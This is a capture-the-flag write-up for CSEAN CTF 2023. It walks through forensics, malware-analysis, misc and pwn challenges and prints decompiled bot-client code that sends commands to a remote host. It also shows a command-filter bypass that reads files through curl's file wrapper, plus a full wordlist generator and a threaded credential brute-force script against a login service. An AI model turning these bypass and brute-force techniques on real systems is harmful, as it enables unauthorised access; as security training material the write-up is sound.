<h3> CSEAN CTF 2023 </h3>

### Description: This was a fun ctf I participated and it taught me new things >3

<h3> Challenge Solved: </h3>

## Forensics
-  Communication Is Key

## Malware Analysis
-  Two Way Street

## Misc
-  Welcome! Welcome!

## Pwn
-  ChatterBox

## Web
- Play By EAR 
- Enum Enum 
- FirstOfWAF  
- Handover
- Report Phish 
- Stupid Reset
- Handover 2


### Forensics 1/1:~

#### Communication Is Key
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5e2a7a4f-40a9-44c6-b0c2-48a00ebf1d39)

After downloading the attached file checking the file type shows that it is a windows executable
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/38f3d7e1-a260-4a34-bcd6-713f82f383b4)

I normally would try decompile it in ghidra but I don't like decompilling .exe file in ghidra 

So instead what I did was to run it

Doing that I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0e868522-6cf0-45ed-9bbc-c025f7587896)

From the challenge name `communication` it is likely making some sort of requests 

So confirm that I opened wireshark then listened on all network interface
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ddbf73a-26a9-4def-8b27-755ea49f2e1d)

Then I ran the binary again and got this 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b51361d1-2c72-4296-87f0-d789b6b1a25a)

There are http packets

I followed tcp stream and got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6a7f6316-899c-4db6-8296-31b503929c35)

Also this binary is a python compiled binary

We can either confirm this by decompilling it or from the user agent we can see it's python2.8

Anyways since we got the flag what's the use of going through that

```
Flag: csean-ctf{CommunicationIsKey_NO_DOUBts!}
```

### Malware Analysis 1/1 :~

#### Two Way Street 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e14da56-e726-4b2e-a2e7-01b80b52c0a3)

I am not a Malware Person but luckily this wasn't tough

First thing I did was to check the file type
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/14bd9c92-644e-4f09-b48c-70ba48d3993d)

A windows executable

I uploaded it in [virus total](https://www.virustotal.com/gui/home/upload) 

And on checking the details I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e14ded4d-0318-4444-b78d-7dcba8b3e98b)

It's also a python compiled binary

Next thing is to convert it to a `.pyc` file then decompile the `.pyc` 

To convert it to a `.pyc` file I used [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) 

Here's the resource that helped me out [hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/.pyc) 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/80d555e4-769d-4c78-a77c-ca8898f08f0a)

Now I will use [uncompyle6](https://pypi.org/project/uncompyle6/) to decompile it

```r
uncompyle6 client.pyc > client.py
```

Doing that gives me this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/592012df-889d-4529-9ffd-b4a5700bf80b)

```python
from pwn import *
import platform
import subprocess
content.log_level = 'warning'

def send_command(host, port, command):
    conn = recvuntil(host, port)
    conn.recvuntil(b'$> ')
    conn.sendline(b'' _ command.encode())
    output = conn.recv(10240).decode().strip()
    conn.close()
    return f'''{output}'''

host = '0.cloud.chals.io'
port = 21440
command = 'hostname'
response = send_command(host, port, command)
note = 'Congratulations! You have been hacked. Now you are part of our mighty and growing botnets'
response = response.split('\n')[:-2]
response = '\n'.join(response)
print(response)
```

We can see that this script basically executes command on this remote instance `0.cloud.chals.io` running on port `21440`

I connect to it and it showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ad1f41d9-48a5-40b5-8e71-27f3a31576b6)

I tried catting the flag but got this error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d7ffd688-6429-42ab-979b-578d2e9cad50)

Seems to filter that

But it was easily bypassable 

Since `ls` isn't filtered I did this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57cefcd7-ac06-4c29-936b-bbb62f241eca)

The commands will execute if an allowed command is also used

I checked the source and got the allowed commands

```python
allowed_commands = ["curl", "wget", "hostname", "date", "ls", "whoami"]
```

If we assume that an intensive filter check is used we can still get the flag since we have access to `curl` 

Basically using `file` wrapper
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/102972b9-6eaa-4181-985a-6a5f2cbb9210)

```
Flag: csean-ctf{when_THE_HACKER_gets_hacked :)}
```

### Misc 1/1:~

#### Welcome! Welcome!
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c44b22fe-1286-4904-b011-91b9ab7e965a)

We are given this string `Y3NlYW4tY3Rme3dlbGNvbWVfdG9fdGhlX2dhbWV6enp6IX0=` and we can tell it's base64 cause of `=` 

Decoding it can be done from the terminal
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/38cf17cb-7e39-4f51-9fa6-51a0f4e1f3c8)

But if I didn't know what it was I would have used [cyberchef](https://gchq.github.io/CyberChef/) or [dcodefr](https://www.dcode.fr/cipher-identifier)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/752ccb44-86c1-4abf-837d-241ff46db2e0)

```
Flag: csean-ctf{welcome_to_the_gamezzzz!}
```

### Pwn 1/1:~

#### ChatterBox [First Blood 🩸]
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6bb8ee28-f7ad-4803-a864-700b9a1e31a2)

This challenge isn't really bianry exploitation in my opinion just more of like scripting

Anyways we are given this:

```
If you ever need to talk, just reach out to any of our employees.

As a side note, we think you should know we like talking in months and days. Hopefully you understand.
```

Connecting to the remote instance shows this prompt
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/29c4cb02-fc71-4e12-9472-98f7bd319d04)

So we are to find a way to access this

I assumed that the username will be `admin` but now for the password how do we go about it?

Well I can always try brute force using a wordlist like rockyou but it might take a while

So back to what the description says :

```
As a side note, we think you should know we like talking in months and days. Hopefully you understand.
```

This is a hint that's based on using months and days

I then make a script to create a wordlist and brute force the password

Here's the script I used to create the wordlist

```
#!/usr/bin/python3

# Hint to how the password should be: As a side note, we think you should know we like talking in months and days. 

# Months
months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
months_upper = [j.upper() for j in months]
months2_lower = [i.lower() for i in months]

# Date
dates = [str(date) for date in range(32)]

# Form the wordlist
wordlist = []

for month in months:
    for date in dates:
        wordlist.append(month + date)

for month in months_upper:
    for date in dates:
        wordlist.append(month + date)

for month in months2_lower:
    for date in dates:
        wordlist.append(month + date)


# Save wordlist
with open('wordlist.txt', 'w') as fd:
    for i in wordlist:
        fd.write(i+'\n')
```

And I used this to brute force 

```python
#!/usr/bin/python3
from pwn import *
import sys
from multiprocessing import Pool as pool
from warnings import filterwarnings

# Set context
context.log_level = 'info'
filterwarnings('ignore')

# Define a function for the brute force >3
def brute_password(password):
    io = remote('0.cloud.chals.io', 33091)
    io.recv(1024) 
    io.sendline(b"admin")
    io.recv(1024)
    io.sendline(password)
    result = io.recv(1024)
    print(result)
    if b"Invalid credentials" not in result:
        print(f'Password: {password}')
        
        
# Read password from the wordlist 
with open('wordlist.txt', 'r') as fd:
    wordlist = fd.readlines()

if __name__ == '__main__':
    start = pool(int('5'))
    start.map(brute_password, wordlist)

# Credential: admin:july10
```



